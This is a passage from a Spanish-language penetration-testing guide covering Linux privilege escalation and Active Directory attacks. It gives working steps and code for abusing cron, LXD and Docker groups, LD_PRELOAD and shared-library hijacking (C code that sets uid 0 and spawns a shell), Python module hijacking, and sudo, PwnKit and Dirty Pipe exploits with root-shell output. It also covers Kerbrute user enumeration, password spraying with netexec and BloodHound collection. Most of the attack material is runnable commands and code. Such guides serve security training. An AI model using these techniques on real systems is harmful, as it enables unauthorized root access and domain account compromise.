Para ver los trabajos cron de todo el sistema, podemos verificar los archivos en `/etc/crontab`, `/etc/cron.d/`, y `/var/spool/cron/crontabs/`.

###### Explotación de tareas cron

###  10.3. <a name='técnicas-de-explotación-de-trabajos-cron'></a>Técnicas de explotación de trabajos Cron

| Técnica                          | Descripción                                                                                   |
|----------------------------------|-----------------------------------------------------------------------------------------------|
| **Modificación de scripts**       | Si un script ejecutado por Cron tiene permisos de escritura globales, un atacante puede modificarlo para ejecutar comandos arbitrarios. |
| **Creación de scripts maliciosos** | Si Cron ejecuta un script específico, un atacante puede crear un script con el mismo nombre y colocarlo en un directorio que tenga prioridad en el `PATH`. |
| **Condiciones de carrera**        | Un atacante puede reemplazar rápidamente un script mientras Cron lo está ejecutando, aprovechando ventanas de tiempo críticas. |
| **Manipulación de variables de entorno** | Si Cron depende de variables de entorno no configuradas o no depuradas, un atacante puede manipularlas para alterar el comportamiento del comando ejecutado. |
| **Manipulación de rutas (PATH)**  | Si Cron usa comandos sin rutas absolutas, un atacante puede modificar la variable `PATH` para ejecutar versiones maliciosas de esos comandos. |
| **Ataques de enlace simbólico**   | Si Cron escribe la salida en un archivo, un atacante puede crear un enlace simbólico desde ese archivo a un archivo confidencial o a un script controlado por él. |
| **Uso de características del shell** | Si Cron usa un shell como `bash`, un atacante puede explotar características como la sustitución de comandos para ejecutar código arbitrario. |
| **Inserción en el Crontab**       | Si un usuario con privilegios permite que otros agreguen entradas al Crontab (por ejemplo, con `crontab -e`), un atacante puede insertar comandos maliciosos. |
| **Permisos de usuario insuficientes** | Si Cron se ejecuta con privilegios elevados y no restringe adecuadamente los scripts o binarios que ejecuta, un atacante puede modificar o crear archivos para escalar privilegios. |
| **Manipulación de la salida**     | Si la salida de Cron se guarda en un archivo con permisos de escritura globales, un atacante puede manipular o reemplazar este archivo para ejecutar código arbitrario. |
| **Ataques de sincronización**    | Conociendo el momento exacto en que se ejecuta un trabajo Cron, un atacante puede lanzar ataques sincronizados, como la manipulación de scripts justo antes de su ejecución. |
| **Inclusión de archivos locales (LFI)** | Si Cron incluye archivos sin validar adecuadamente la entrada, un atacante puede aprovechar esto para incluir archivos maliciosos que se ejecuten durante la tarea programada. |

##### LXC / LXD

###### Linux Containers (LXC)

**Linux Containers (LXC)** es una técnica de virtualización a nivel de sistema operativo que permite que varios sistemas Linux se ejecuten de forma aislada en un único host, al poseer sus propios procesos, pero compartir el kernel del sistema host. LXC es muy popular gracias a su facilidad de uso y se ha convertido en un componente esencial de la seguridad informática. 

###### Linux Daemon (LXD)

**Linux Daemon (LXD)** es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicaciones, sino un contenedor de sistema. Antes de poder usar este servicio para escalar nuestros privilegios, debemos estar en el grupo `lxc` o `lxd`. Podemos averiguarlo con el siguiente comando: 

```
elliot@debian:~$ id

uid=1000(elliot) gid=1000(elliot) groups=1000(container-user),116(lxd)
```

###### Explotación

A continuación, se describe el proceso para explotar un contenedor LXD/LXC con privilegios elevados y obtener acceso de root en el sistema host. Este método implica la creación de un contenedor privilegiado que monta el sistema de archivos del host, permitiendo la modificación de archivos críticos como `/etc/shadow`.

1. **Descargar y transferir la imagen Alpine**:

    - Descarga la imagen mínima de Alpine Linux desde `https://github.com/saghul/lxd-alpine-builder.git`

        ```bash
        git clone https://github.com/saghul/lxd-alpine-builder.git
        ```
    - Transferir el archivo `alpine-v3.3-x86_64-20160114_2308.tar.gz`.

2. **Inicializar LXD**:

    - Ejecutamos `lxd init` para inicializar el demonio de contenedores de Linux (**LXD**).

3. **Importar la imagen local**:

    - Usamos el siguiente comando para importar la imagen:

        ```bash
        lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine
        ```

    - Verificmos la importación con:
    
        ```bash
        lxc image list
        ```
4. **Crear un contenedor privilegiado**:

    - Iniciamos un contenedor con privilegios elevados usando:

        ```bash
        lxc init alpine privesc -c security.privileged=true
        ```
        
        - `alpine`: Nombre de la imagen.
        - `privesc`: Nombre del contenedor.
        - `security.privileged=true`: Permite que el contenedor se ejecute con los mismos privilegios que el usuario `root` en el host.

5. **Montar el sistema de archivos del host**:
    - Montamos todo el sistema de archivos del host (`/`) en el contenedor:

        ```bash
        lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
        ```

        - `source=/`: Ruta del sistema de archivos del host.
        - `path=/mnt/root`: Ruta de montaje en el contenedor.
        - `recursive=true`: Asegura que todos los archivos y carpetas sean accesibles.

6. **Iniciar el contenedor**:
    - Iniciamos el contenedor con:

        ```bash
        lxc start privesc
        ```

    - Verificamos el estado del contenedor con:

        ```bash
        lxc list
        ```
7. **Ejecutar comandos dentro del contenedor**:
    - Accedemos a una shell dentro del contenedor:

        ```bash
        lxc exec privesc /bin/sh
        ```
8. **Modificar el sistema de archivos del host**:

    - Dentro del contenedor, navegamos a `/mnt/root` para acceder al sistema de archivos del host.

    - Editamos archivos críticos como `/mnt/root/etc/shadow` para cambiar la contraseña de `root`.

    - Esto permite iniciar sesión como `root` en el host.
    - También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`.

##### Escalación de Privilegios - Docker

Si somos miembros del grupo `docker`, podemos escalar nuestros privilegios a `root`.

La idea es montar el directorio `/` de la máquina host en nuestro contenedor. Una vez montado el directorio, tendremos acceso a `root` en nuestro contenedor y podremos manipular cualquier archivo del sistema de archivos del host a través del contenedor.

```bash
docker run -v /:/mnt -it alpine
```
Montamos el directorio `/` (raíz) del host en el directorio `/mnt` del contenedor y con la opción `-it` le indicamos que queremos ejecutar una termina interactiva y que la imágen base será `alpine`.

En caso de que la máquina víctima no tenga acceso a internet, podemos hacer lo siguiente:

- `docker pull alpine`: Descargamos la imagen de Alpine en nuestra máquina atacante.
- `docker save -o alpine.tar alpine`: Guardamos la imagen de Alpine en un archivo tar y la transferimos a la máquina víctima.
- `docker load -i alpine.tar`: Cargamos la imagen desde el archivo tar.
- `docker image ls`: Comprobamos que se cargo correctamente la imagen.
- `docker run -v /:/mnt -it alpine`: Creamos el contenedor.

##### LD_PRELOAD Shared Library

Para realizar este ataque, se requiere:

- Un usuario con privilegios sudo que pueda ejecutar al menos un comando (no importa cuál).
- El uso de la variable de entorno `LD_PRELOAD` para lograr persistencia al invocar sudo.

###### Sobre las bibliotecas compartidas

Son archivos de código precompilado que múltiples programas pueden utilizar simultáneamente. Su propósito principal es:

- Modularizar el código, evitando duplicaciones.
- Permitir que distintas aplicaciones compartan funciones y recursos de manera eficiente.

###### ¿Qué es LD_PRELOAD?

Es una variable de entorno en sistemas Unix/Linux que fuerza la carga de una biblioteca compartida específica antes que las demás al ejecutar un programa. Esto permite:

- Sobrescribir funciones de bibliotecas estándar (útil para debugging o, en este caso, para explotación).

- Modificar el comportamiento de programas sin recompilarlos.

###### Ejemplo

```bash
elliot@debian:~$ sudo -l

Matching Defaults entries for daniel.carter on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on debian:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

En el ejemplo anterior, observamos que:

- El usuario elliot tiene permisos para ejecutar el comando apache2 como root sin necesidad de ingresar la contraseña.

- La configuración de sudo incluye `env_keep+=LD_PRELOAD`, lo que significa que las variables de entorno (incluyendo `LD_PRELOAD`) se conservan al ejecutar comandos con sudo.

###### Pasos para el Ataque

1. **Creación de una Biblioteca Compartida Maliciosa**:

    - Desarrollaremos una biblioteca compartida diseñada para sobrescribir funciones clave (ej: libc).

2. **Inyección mediante `LD_PRELOAD`**:

    - Usaremos la variable LD_PRELOAD para cargar nuestra biblioteca maliciosa antes que las bibliotecas del sistema.

3. **Ejecución del Comando Privilegiado**:

    - Al correr sudo `/usr/sbin/apache2 restart`, el sistema cargará nuestra biblioteca maliciosa debido a `LD_PRELOAD`, permitiéndonos ejecutar código arbitrario con privilegios de root.

###### Creación de bibliotecas compartidas maliciosas 

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compilamos el código:

```bash
gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
```

Ejecutamos el código:

```bash
elliot@debian:~$ $: sudo LD_PRELOAD=/locatio_of_malicious_library/malicious.so /usr/bin/ping
root@@debian #: whoami
root
```

##### Shared Object

###### ¿Qué es un Shared Object (.so)?

Un `shared object` (objeto compartido) es un archivo binario compilado que contiene código y datos reutilizables por múltiples programas. En sistemas **Unix-like** (como Linux), estos archivos tienen la extensión **.so** y permiten:

- **Reducir redundancia**: Varios programas pueden cargar la misma biblioteca en memoria.
- **Ahorrar recursos**: Evita duplicar código en cada ejecutable.

###### Explotación mediante Manipulación de Bibliotecas

Algunos binarios utilizan bibliotecas personalizadas (no estándar). Si tenemos acceso de escritura sobre estas, podemos escalar privilegios.

Ejemplo Práctico

1. **Identificar un binario con SUID (ejecución como propietario, normalmente root)**:

    ```bash
    elliot@debian:~$ ls -la custom_binary
    -rwsr-xr-x 1 root root 16728 Jan 12 11:05 custom_binary
    ```

2. **Verificar las bibliotecas que usa el binario (comando `ldd`)**:

    ```bash
    elliot@debian:~$ ldd custom_binary
    libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f0c13112000)
    ```

    Se observa que usa una biblioteca no estándar: `libshared.so`.

3. **Ubicar la ruta de carga de bibliotecas (comando `readelf`)**:

    ```bash
    elliot@debian:~$ readelf -d custom_binary | grep PATH
    0x00000000000000 (RUNPATH)  Library runpath: [/development]
    ```

    El binario carga la bibliotecas desde `/development`.

4. **Explotación (si tenemos escritura en `/development`)**

    - Creamos una biblioteca maliciosa (`libshared.c`):

    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    void dbquery() {
        setuid(0);
        system("/bin/sh -p");
    }
    ```
    
    - Compilamos y reemplazamos la biblioteca original:

    ```bash
    gcc src.c -fPIC -shared -o /development/libshared.so
    ```
    - Ejecutamos el binario `custom_binary`

    ```bash
    elliot@debian:~$ ./custom_binary
    # id
    uid=0(root) gid=1000(elliot) groups=1000(elliot)
    ```

##### Python Library Hijacking

###### ¿Qué es?

El **Python Library Hijacking** es una vulnerabilidad de seguridad que permite a un atacante ejecutar código arbitrario manipulando el entorno de Python para cargar una biblioteca maliciosa en lugar de la legítima. Esto puede llevar a:

- **Escalada de privilegios** (si el script se ejecuta como root).
- **Ejecución remota de comandos (RCE)** en aplicaciones críticas.

###### ¿Cómo funciona?

1. **Carga Dinámica de Módulos**

Python busca los módulos importados en este orden:

- **Directorio del script actual**.
- **Directorios en `PYTHONPATH` (variable de entorno)**.
- **Bibliotecas estándar (`/usr/lib/pythonX.X`)**.
- `site-packages` (paquetes instalados con `pip`).

2. **Explotación por Prioridad de Rutas**

Si un script con SUID (ejecución como root) importa un módulo y:

- Tenemos permisos de escritura en una ruta prioritaria (ej: `/usr/lib/python3.11`).

- **Creamos un archivo malicioso** con el mismo nombre que el módulo legítimo (ej: `requests.py`). Python cargará **nuestro código malicioso** en lugar del módulo original.

###### Caso 1: Módulo con Permisos de Escritura

1. **Identificar un script Python con SUID**:

    ```bash
    ls -l /usr/bin/script.py
    -rwsr-xr-x 1 root root 1000 Jan 10 11:00 /usr/bin/script.py
    ```

2. **Verificar qué módulos importa**:

    ```bash
    cat /usr/bin/script.py
    import requests  # Módulo objetivo
    ```

3. **Ubicar la ruta legítima del módulo**:

    ```bash
    pip3 show requests
    Location: /usr/local/lib/python3.11/dist-packages
    ```

4. **Explotación si tenemos escritura en /usr/lib/python3.11**:

    - Crear un archivo malicioso `requests.py`:

    ```bash
    import os
    os.setuid(0)  # Obtener root
    os.system("/bin/bash -p")  # Spawnear shell privilegiada
    ```

    - Guardarlo en una ruta prioritaria:

    ```bash
    cp requests.py /usr/lib/python3.11/
    ```

    - Al ejecutar el script:

    ```bash
    /usr/bin/script.py  # ¡Shell como root!
    ```

###### Caso 2: Abuso de `PYTHONPATH` (si `sudo` permite `SETENV`)

1. **Verificar permisos `sudo`**:

    ```bash
    sudo -l
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python
    ```

2. **Crear un módulo malicioso en /tmp**:

    ```bash
    # /tmp/privesc.py
    import os
    os.system("chmod u+s /bin/bash")
    ```

3. **Ejecutar el script objetivo con PYTHONPATH manipulado**:

    ```bash
    sudo PYTHONPATH=/tmp/ /usr/bin/python /home/elliot/script.py
    ```
##### Grupo `adm`

Los miembros del grupo `adm` pueden leer todos los archivos de logs ubicados en `/var/log`.

##### Grupo `disk`

Los miembros de este grupo tiene acceso completo dentro `/dev` como `/dev/sda`.

##### CVE-2021-3156

Una de las vulnerabilidades más recientes de sudo, CVE-2021-3156, se basa en un desbordamiento de búfer basado en el heap. Esto afectó a las siguientes versiones de sudo:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- y otros

Existe una [PoC](https://github.com/blasty/CVE-2021-3156) pública que se puede utilizar para esto.

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
cat /etc/lsb-release
./sudo-hax-me-a-sandwich <target>
```

##### Bypass de Políticas de Sudo (CVE-2019-14287)

En 2019 se descubrió una vulnerabilidad crítica que afectaba a todas las versiones de Sudo anteriores a la 1.8.28, permitiendo la escalada de privilegios mediante un comando sencillo. Identificada como [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/), esta vulnerabilidad solo requería un único requisito: que el archivo /etc/sudoers permitiera a un usuario ejecutar un comando específico.

Ejemplo Práctico

Al verificar los permisos con `sudo -l`, observamos que el usuario `elliot` tiene permitido ejecutar el comando `/usr/bin/id` en el sistema:

```bash
elliot@debian:~$ sudo -l
[sudo] password for elliot: **********

User elliot may run the following commands on Mrrobot:
    ALL=(ALL) /usr/bin/id
```

###### Explicación de la Vulnerabilidad

Sudo permite ejecutar comandos con IDs de usuario específicos, otorgando los privilegios del usuario asociado a dicho ID. Por ejemplo, el ID del usuario `elliot` se puede obtener del archivo `/etc/passwd`:

```bash
elliot@debian:~$ cat /etc/passwd | grep elliot
elliot:x:1000:1000:elliot,,,:/home/elliot:/bin/bash
```

Aquí, el ID de `elliot` es **1000**. Sin embargo, la vulnerabilidad radica en que, si se ingresa un ID negativo (como `-1`), Sudo lo interpreta como **0** (el ID de **root**). Esto permite obtener una shell con privilegios de root de manera inmediata:

```bash
elliot@debian2:~$ sudo -u#-1 id

root@debian:/home/elliot# id
uid=0(root) gid=1000(elliot) groups=1000(elliot)
```

###### Impacto

Este fallo permitía a cualquier usuario con permisos limitados en `/etc/sudoers` convertirse en root sin autenticación adicional, explotando un error en el manejo de IDs de usuario. La corrección en Sudo `1.8.28` invalidó esta técnica al bloquear el uso de IDs negativos.

##### CVE-2021-4034 / PwnKit

Se descubrió una grave vulnerabilidad de corrupción de memoria en la herramienta pkexec, identificada como CVE-2021-4034 y denominada PwnKit. Este fallo permitía la escalada de privilegios y permaneció oculto durante más de diez años, sin que se pueda determinar con exactitud cuándo fue explotado por primera vez. Finalmente, fue revelado públicamente en noviembre de 2021 y corregido dos meses después.
Explotación

Para aprovechar esta vulnerabilidad, es necesario:

- Descargar un Proof of Concept (PoC) diseñado para el ataque.
- Compilarlo directamente en el sistema objetivo o en una réplica del entorno vulnerable.

```bash
elliot@debian:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
elliot@debian:~$ cd CVE-2021-4034
elliot@debian:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez compilado el código, podemos ejecutarlo sin más. Obteniendo una shell como `root`.

```bash
elliot@debian:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

##### Dirty Pipe (CVE-2022-0847)

La vulnerabilidad [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)) en el kernel de Linux permite escribir en archivos privilegiados del usuario root sin autorización. Técnicamente, es similar a la vulnerabilidad [Dirty Cow (2016)](https://dirtycow.ninja/) y afecta a los kernels desde la versión `5.8` hasta la `5.17`.

###### Impacto:

Permite a un usuario con solo permisos de lectura sobre un archivo modificarlo arbitrariamente.

También afecta a dispositivos Android, donde aplicaciones maliciosas (ejecutándose con permisos de usuario) podrían aprovecharla para tomar el control del dispositivo.

###### Fundamento técnico:
La vulnerabilidad explota el manejo incorrecto de pipes (tuberías), un mecanismo de comunicación unidireccional entre procesos en sistemas Unix. Por ejemplo, podría usarse para:

- Modificar /etc/passwd y eliminar la contraseña de root, permitiendo acceso con su sin autenticación.

- Sobrescribir binarios críticos o configuraciones del sistema.

###### Explotación:

- Descargar un Proof of Concept ([PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)).

- Compilarlo y ejecutarlo en el sistema objetivo (o una réplica vulnerable).

```bash
elliot@debian:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
elliot@debian:~$ cd CVE-2022-0847-DirtyPipe-Exploits
elliot@debian:~$ bash compile.sh
elliot@debian:~$ ./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

# id

uid=0(root) gid=0(root) groups=0(root)
```

Con la ayuda de la segunda versión del exploit (`exploit-2`), podemos ejecutar binarios SUID con privilegios de root.

```bash
elliot@debian:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root)
```

##  11. <a name='active-directory'></a>Active Directory

###  11.1. <a name='powershell-para-gestionar-active-directory'></a>PowerShell para gestionar Active Directory

Listado de Cmdlets utiles para realizar operaciones y enumeración básica en Active Directory.

####  11.1.1. <a name='importar-módulo-de-active-directory'></a>Importar módulo de Active Directory

Para utilizar la mayoria de los Cmdlets listados a continuación, debemos importar en primer lugar el modulo `ActiveDirectory`.

```powershell
Import-Module ActiveDirectory
```

####  11.1.2. <a name='sistema'></a>Sistema

##### Obtener Variables de entorno

```powershell
Get-ChildItem Env:
```
##### Obtener funciones en el scope de Powershell

```powershell
Get-Command -CommandType Function
```
##### Obtener una lista de los modulos de PowerShell cargados

```powershell
Get-Module
```

##### Listar comandos para un módulo específico

```powershell
Get-Command -Module ActiveDirectory
```

##### Obtener información del Dominio

```powershell
Get-ADDomain
```

##### Obtener ayuda de un cmd-let

```powershell
Get-Help <cmd-let>
```

##### Obtener el estado actual de Windows Defender

```powershell
Get-MpComputerStatus
```

##### Obtener AppLockerPolicy

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

####  11.1.3. <a name='usuarios'></a>Usuarios

##### Crear un nuevo usuario

```powershell
New-ADUser -Name "NombreUsuario" -SamAccountName "NombreUsuario" -UserPrincipalName "NombreUsuario@dominio.local" -AccountPassword (ConvertTo-SecureString -AsPlainText "Contraseña" -Force)
```

##### Filtrar por un nombre de usuario especifico

```powershell
Get-ADUser -Filter * | Where-Object {$_.SamAccountName -eq "NombreUsuario"}
```

En este comando:

- `Get-ADUser -Filter *` obtiene todos los usuarios de Active Directory.

- `Where-Object` se utiliza para filtrar los resultados.

- `{}` delimita el script de bloque para la condición de filtro.

- `$_` representa el objeto actual en el pipeline (en este caso, cada usuario obtenido por Get-ADUser).

- `.SamAccountName` es la propiedad que contiene el nombre de usuario.

- `-eq "NombreUsuario"` es el operador de igualdad para comparar el valor de la propiedad SamAccountName con el nombre de usuario que deseas buscar.

##### Filtrar por un usuario donde el campo ServicePrincipalName sea distinto de null

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

##### Crear un nuevo usuario asignado algunos atributos

```powershell
New-ADUser -Name "first last" -Accountpassword (Read-Host -AsSecureString "Super$ecurePassword!") -Enabled $true -OtherAttributes @{'title'="Analyst";'mail'="f.last@domain.local"}
```

##### Agregar un usuario a un grupo específico

```powershell
Add-ADGroupMember -Identity "NombreGrupo" -Members "NombreUsuario"
```

##### Cambiar la contraseña de un usuario

```powershell
Set-ADAccountPassword -Identity "NombreUsuario" -NewPassword (ConvertTo-SecureString -AsPlainText "NuevaContraseña" -Force) -Reset
```

##### Obtener los grupos del un usuario
```powershell
$user = Get-ADUser -Identity "NombreUsuario"
$groups = Get-ADPrincipalGroupMembership -Identity $user
$groups | Select-Object -ExpandProperty Name
```

##### Quitar un usuario de un grupo
```powershell
Remove-ADGroupMember -Identity "NombreGrupo" -Members "NombreUsuario"
```

##### Deshabilitar una cuenta de usuario
```powershell
Disable-ADAccount -Identity "NombreUsuario"
```

##### Habilitar una cuenta de usuario
```powershell
Enable-ADAccount -Identity "NombreUsuario"
```

##### Desbloquear una cuenta de usuario
```powershell
Unlock-ADAccount -Identity "NombreUsuario"
```

##### Obtener información detallada de un usuario
```powershell
Get-ADUser -Identity "NombreUsuario" -Properties *
```

####  11.1.4. <a name='grupos'></a>Grupos

##### Crear un nuevo grupo
```powershell
New-ADGroup -Name "NombreGrupo" -GroupCategory Security -GroupScope Global -DisplayName "Nombre Descriptivo del Grupo" -Description "Descripción del Grupo"
```

##### Listar los miembros de un grupo
```powershell
Get-ADGroupMember -Identity "NombreGrupo" | Select-Object Name, SamAccountName
```

##### Obtener información detallada de un grupo
```powershell
Get-ADGroup -Identity "NombreGrupo" -Properties *
```

##### Renombrar un grupo
```powershell
Rename-ADObject -Identity "CN=NombreGrupo,OU=Origen,DC=dominio,DC=com" -NewName "NuevoNombreGrupo"
```
##### Eliminar un grupo
```powershell
Remove-ADGroup -Identity "NombreGrupo"
```

##### Listar los grupos
```powershell
Get-ADGroup -Filter * | select name
```

##### Obtener una lista de todos los grupos en una OU específica
```powershell
Get-ADGroup -Filter * -SearchBase "OU=NombreOU,DC=dominio,DC=com"
```

##### Obtener una lista de todos los miembros de un grupo
```powershell
Get-ADGroupMember -Identity "NombreGrupo"
```
####  11.1.5. <a name='trusts-(confianzas)'></a>Trusts (Confianzas)

##### Verificar las relaciones de confianza de dominio

```powershell
Get-ADTrust -Filter *
```
Este cmdlet imprimirá las relaciones de confianza que tenga el dominio. Podemos determinar si son confianzas dentro de nuestro bosque o con dominios de otros bosques, el tipo de confianza, la dirección de la confianza y el nombre del dominio con el que está la relación.

####  11.1.6. <a name='computadoras'></a>Computadoras

##### Obtener información detallada de un equipo

```powershell
Get-ADComputer -Identity "NombreEquipo" -Properties *
```

##### Obtener una lista de todos los equipos en un dominio

```powershell
Get-ADComputer -Filter *
```

##### Obtener información detallada de un equipo específico

```powershell
Get-ADComputer -Identity "NombreEquipo" -Properties *
```

##### Crear un nuevo objeto de equipo en Active Directory

```powershell
New-ADComputer -Name "NombreEquipo" -Path "OU=NombreOU,DC=dominio,DC=com"
```

##### Cambiar el nombre de un equipo en Active Directory

```powershell
Rename-ADObject -Identity "CN=NombreEquipo,OU=Origen,DC=dominio,DC=com" -NewName "NuevoNombreEquipo"
```

##### Deshabilitar una cuenta de equipo

```powershell
Disable-ADAccount -Identity "NombreEquipo"
```

##### Habilitar una cuenta de equipo

```powershell
Enable-ADAccount -Identity "NombreEquipo"
```
##### Eliminar un objeto de equipo de Active Directory

```powershell
Remove-ADComputer -Identity "NombreEquipo"
```

####  11.1.7. <a name='unidades-organizativas'></a>Unidades Organizativas

##### Crear una nueva Unidad Organizativa

```powershell
New-ADOrganizationalUnit -Name "NombreOU" -Path "OU=ParentOU,DC=dominio,DC=com"
```

##### Mover un objeto (usuario, grupo, etc.) a una OU diferente

```powershell
Move-ADObject -Identity "CN=NombreObjeto,OU=Origen,DC=dominio,DC=com" -TargetPath "OU=Destino,DC=dominio,DC=com"
```

##### Obtener una lista de todas las unidades organizativas

```powershell
Get-ADOrganizationalUnit -Filter *
```

##### Mover un equipo a una unidad organizativa diferente

```powershell
Move-ADObject -Identity "CN=NombreEquipo,OU=Origen,DC=dominio,DC=com" -TargetPath "OU=Destino,DC=dominio,DC=com"
```

####  11.1.8. <a name='gpo-(group-policy-object)'></a>GPO (Group Policy Object)

##### Obtener una lista de todas las GPO

```powershell
Get-GPO -All
```

##### Obtener una lista de todas las GPO en un dominio específico

```powershell
Get-GPO -All -Domain "NombreDominio"
```
##### Crear una nueva GPO

```powershell
New-GPO -Name "NombreGPO"
```
##### Cambiar el nombre de una GPO

```powershell
Rename-GPO -Name "NombreActualGPO" -NewName "NuevoNombreGPO"
```
##### Copiar una GPO

```powershell
Copy-GPO -SourceName "NombreGPOOrigen" -TargetName "NombreGPODestino"
```
##### Eliminar una GPO

```powershell
Remove-GPO -Name "NombreGPO"
```
##### Obtener la configuración de una GPO

```powershell
Get-GPOReport -Name "NombreGPO" -ReportType XML
```
##### Establecer la configuración de una GPO

```powershell
Set-GPRegistryValue -Name "NombreGPO" -Key "HKEY_CURRENT_USER\Software\Ejemplo" -ValueName "Ejemplo" -Type String -Value "ValorEjemplo"
```

##### Enlace de una GPO a una OU específica

```powershell
New-GPLink -Name "NombreGPO" -Target "OU=NombreOU,DC=dominio,DC=com"
```
##### Desenlace de una GPO de una OU específica

```powershell
Remove-GPLink -Name "NombreGPO" -Target "OU=NombreOU,DC=dominio,DC=com"
```
##### Realizar una copia de seguridad y restauración de una GPO

Para realizar una copia de seguridad:

```powershell
Backup-GPO -Name "NombreGPO" -Path "C:\Ruta\Backup"
```

Para restaurar desde una copia de seguridad:

```powershell
Restore-GPO -Name "NombreGPO" -Path "C:\Ruta\Backup"
```

###  11.2. <a name='habilitar-dont-req-pre-auth'></a>Habilitar DONT-REQ-PRE-AUTH

```powershell
# Nombre del usuario a modificar
$user = "usuario.test"

# Obtener el objeto del usuario
$u = Get-ADUser -Identity $user -Properties userAccountControl

# Mostrar los flags actuales
Write-Host "UAC antes: $($u.userAccountControl)"

# Agregar la flag de DONT_REQUIRE_PREAUTH
$newUAC = $u.userAccountControl -bor 0x400000

# Aplicar el nuevo valor
Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}

# Verificar
(Get-ADUser -Identity $user -Properties userAccountControl).userAccountControl
```

###  11.3. <a name='deshabilitar-dont-req-pre-auth'></a>Deshabilitar DONT-REQ-PRE-AUTH

```powershell
$newUAC = $u.userAccountControl -band -bnot 0x400000
Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
```

###  11.4. <a name='enumeración-3'></a>Enumeración

Si no tenemos un usuario con el que empezar las pruebas (que suele ser el caso), tendremos que encontrar una manera de establecer un punto de apoyo en el dominio, ya sea obteniendo credenciales en texto claro o un hash de contraseña NTLM para un usuario, un shell SYSTEM en un host unido al dominio, o un shell en el contexto de una cuenta de usuario de dominio. Obtener un usuario válido con credenciales es crítico en las primeras etapas de una prueba de penetración interna. Este acceso (incluso al nivel más bajo) abre muchas oportunidades para realizar enumeraciones e incluso ataques.

####  11.4.1. <a name='kerbrute'></a>Kerbrute

[Kerbrute](https://github.com/ropnop/kerbrute) puede ser una opción más sigilosa para la enumeración de cuentas de dominio. Se aprovecha del hecho de que los fallos de pre-autenticación Kerberos a menudo no activan registros o alertas. Utilizaremos Kerbrute junto con las listas de usuarios como pueden ser **jsmith.txt** o **jsmith2.txt** de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Este repositorio contiene muchas listas de usuarios diferentes que pueden ser extremadamente útiles cuando se intenta enumerar usuarios cuando se comienza desde una perspectiva no autenticada. Podemos apuntar Kerbrute al DC y alimentarlo con una lista de palabras. La herramienta es rápida, y se nos proporcionarán resultados que nos permitirán saber si las cuentas encontradas son válidas o no, lo cual es un gran punto de partida para lanzar ataques como el de Password Spraying.

Por medio de una lista de usuarios, como puede ser las mencionadas anteriormente podemos ver usuarios válidos a nivel de dominio gracias a los fallos de pre-autenticación Kerberos

```bash
kerbrute userenum -d HACKLAB.LOCAL --dc 192.168.56.10 jsmith.txt -o ad_users.txt
```

Puede haber veces que un usuario tenga de contraseña su mismo nombre de usuario:

```bash
kerbrute bruteuser --d HACKLAB.LOCAL -dc 192.168.56.10 jsmith.txt thomas.brown
```

Otras herramientas a tener en cuenta son [RPCClient](#426-rpcclient) y [Enum4Linux](#424-enum4linux).


####  11.4.2. <a name='password-spraying'></a>Password Spraying

Otro aspecto destacable es el ataque conocido como Password Spraying. Para contextualizar, imaginemos que disponemos de unas credenciales como `thomas.brown:MySup3erPass123!`. Una táctica común en este escenario es conectarse al Protocolo de Llamada a Procedimientos Remotos (RPC) - para extraer una lista de todos los usuarios del dominio. Esta lista se guarda en un archivo, por ejemplo users.txt, y luego se proporciona como entrada a herramientas como el propio netexec, junto con la contraseña antes mencionada. Este proceso permite intentar el acceso a múltiples cuentas del dominio, aprovechando la débil seguridad de la contraseña utilizada.

```bash
nxc smb 192.168.56.10 -u users.txt -p 'password' --continue-on-success
```

Por otra parte, si contamos con una lista de contraseñas también podemos utilizarlas.

```bash
nxc smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
```

El argumento `--no-bruteforce` se emplea para evitar la prueba de todas las contraseñas disponibles para cada usuario, en su lugar, se prueba el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la línea 2 con la contraseña de la línea 2, y así sucesivamente.

####  11.4.3. <a name='bloodhound'></a>BloodHound

##### Opción 1

La primera forma de enumerar con Bloodhound, es hacerlo desde la máquina atacante utilizando `bloodhound.py`.

```bash
python3 bloodhound.py -u 'thomas.brown' -p 'MySup3erPass123!' -d HACKLAB.local -ns 192.168.56.10 -ns 192.168.56.10 --zip -c All
```

